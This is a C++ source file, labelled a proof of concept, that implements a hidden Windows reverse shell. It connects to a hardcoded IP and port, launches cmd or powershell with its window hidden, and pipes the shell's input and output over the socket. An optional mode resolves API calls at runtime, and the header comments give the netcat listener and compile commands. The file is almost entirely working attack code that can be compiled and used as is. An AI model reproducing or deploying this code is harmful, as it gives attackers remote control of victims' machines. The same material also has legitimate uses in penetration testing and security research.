/* **********************************************************************
 *  PoC: revshell.cpp	
 *  Author: lorenzoinvidia
 *
 *  Description:
 *  Open a hidden reverse powershell using win32 WSA sockets
 *
 *  From server: nc -l -v PORT
 *  Compile: cl /EHsc /Gz revshell.cpp
 *
 * ********************************************************************** 
 * */

#include <Windows.h> 

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

//#define RUNTIME_LINK    		// Uncomment for runtime linking

#define MAX_BUFF 1024
#define IP "192.168.1.242"		// Server's IP
#define PORT 5555				// Server's listening port
#define CMD "powershell"		// Open a powershell

HMODULE hWs2 = LoadLibraryA("Ws2_32.dll");
typedef SOCKET (WINAPI *_WSASocket)(int, int, int, LPVOID, DWORD, DWORD);
_WSASocket pWSASocket = (_WSASocket)GetProcAddress(hWs2, "WSASocketA");

#ifndef RUNTIME_LINK
#pragma comment(lib, "Ws2_32.lib")
#else

HMODULE hK32 = LoadLibraryA("Kernel32.dll");

typedef void* (WINAPI *_WSAStartup)(WORD, LPWSADATA);
typedef int (WINAPI *_WSACleanup)();
typedef int (WINAPI *_bind)(SOCKET, const sockaddr *, int);
typedef int (WINAPI *_listen)(SOCKET, int);
typedef SOCKET (WINAPI *_socket)(int, int, int);
typedef int (WINAPI *_closesocket)(SOCKET);
typedef SOCKET (WINAPI *_accept)(SOCKET, const sockaddr *, int);
typedef int (WINAPI *_recv)(SOCKET, char *, int, int);
typedef u_short (WINAPI *_htons)(u_short);
typedef int (WINAPI *_connect)(SOCKET, const sockaddr *, int);
typedef unsigned long (WINAPI *_inet_addr)(const char *);
typedef BOOL (WINAPI * _CreateProcess)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);


_WSAStartup pWSAStartup = (_WSAStartup)GetProcAddress(hWs2, "WSAStartup");
_WSACleanup pWSACleanup = (_WSACleanup)GetProcAddress(hWs2, "WSACleanup");
_bind pBind = (_bind)GetProcAddress(hWs2, "bind");
_listen pListen = (_listen)GetProcAddress(hWs2, "listen");
_socket pSocket = (_socket)GetProcAddress(hWs2, "socket");
_closesocket pCloseSocket = (_closesocket)GetProcAddress(hWs2, "closesocket");
_accept pAccept = (_accept)GetProcAddress(hWs2, "accept");
_recv pRecv = (_recv)GetProcAddress(hWs2, "recv");
_htons pHtons = (_htons)GetProcAddress(hWs2, "htons");
_connect pConnect = (_connect)GetProcAddress(hWs2, "connect");
_inet_addr pInet_addr = (_inet_addr)GetProcAddress(hWs2, "inet_addr");
_CreateProcess pCreateProcess = (_CreateProcess)GetProcAddress(hK32, "CreateProcessA");

#endif //!RUNTIME_LINK

/*
 * SpawnShell
 * Create a hidden cmd and redirect stdin stdout stderr to socket
 */
int SpawnShell(void *sock, char *cmd) {
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi;

	si.cb = sizeof(si);
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = sock;
	si.hStdOutput = sock;
	si.hStdError = sock;

#ifndef RUNTIME_LINK
	CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, (STARTUPINFO*)&si, &pi);
#else
	pCreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, (STARTUPINFO*)&si, &pi);
#endif //!RUNTIME_LINK
	return 0;
}//SpawnShell

int __cdecl main(VOID) {
   WSADATA wd;
   struct sockaddr_in addr = {0};
   STARTUPINFO si = {0};
   PROCESS_INFORMATION pi;


#ifndef RUNTIME_LINK

  	WSAStartup(0x101,&wd);
   	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(IP);
	addr.sin_port = htons(PORT);

   	SOCKET sock = pWSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);

   	connect(sock, (SOCKADDR *)&addr, sizeof(addr));
	SpawnShell((void *)sock, "cmd");

#else

   	pWSAStartup(0x101,&wd);
   	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = pInet_addr(IP);
	addr.sin_port = pHtons(PORT);

   	SOCKET sock = pWSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);

   	pConnect(sock, (SOCKADDR *)&addr, sizeof(addr));
	SpawnShell((void *)sock, CMD);

#endif //!RUNTIME_LINK
   

   return 0; 
} 